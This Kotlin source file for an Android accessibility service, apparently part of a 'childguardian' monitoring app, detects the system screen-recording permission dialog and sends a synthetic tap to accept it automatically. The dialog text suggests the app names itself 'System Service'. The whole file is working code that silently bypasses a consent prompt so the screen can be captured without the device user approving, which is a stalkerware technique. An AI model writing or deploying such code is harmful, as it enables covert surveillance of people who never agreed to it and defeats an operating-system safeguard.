package com.childguardian.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import timber.log.Timber

class AutoClickService : AccessibilityService() {

    // THE SAFETY LOCK: Prevents the Ghost from machine-gunning your screen!
    private var hasFired = false

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val rootNode = rootInActiveWindow ?: return

        // 1. Ensure we are actually looking at the Permission Dialog
        val isDialogVisible = rootNode.findAccessibilityNodeInfosByText("Start recording or casting").isNotEmpty() ||
                rootNode.findAccessibilityNodeInfosByText("System Service will have access").isNotEmpty()

        // If the dialog closes, reload the gun for next time and go to sleep.
        if (!isDialogVisible) {
            hasFired = false
            return
        }

        // If the dialog is open but we ALREADY fired the tap, DO NOTHING. Just wait.
        if (hasFired) {
            return
        }

        // 2. Find the Cancel button to use as our targeting laser
        val cancelNodes = rootNode.findAccessibilityNodeInfosByText("Cancel")
        if (cancelNodes.isNullOrEmpty()) return

        val cancelNode = cancelNodes[0]
        val cancelRect = Rect()
        cancelNode.getBoundsInScreen(cancelRect)

        // 3. Aim exactly 80% across the screen on the exact same horizontal line.
        val screenWidth = resources.displayMetrics.widthPixels
        val targetX = screenWidth * 0.80f
        val targetY = cancelRect.centerY().toFloat()

        Timber.d(">>> GHOST CLICKER: Firing SINGLE sniper shot at X:$targetX, Y:$targetY <<<")

        // 4. LOCK THE GUN IMMEDIATELY so it cannot fire again!
        hasFired = true

        // 5. Fire the physical tap
        performHardwareTap(targetX, targetY)
    }

    private fun performHardwareTap(x: Float, y: Float) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = Path().apply { moveTo(x, y) }

            // A quick, clean 50-millisecond hardware tap
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
                .build()

            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    Timber.d(">>> GHOST CLICKER: Sniper hit confirmed! <<<")
                }
            }, null)
        }
    }

    override fun onInterrupt() {}
}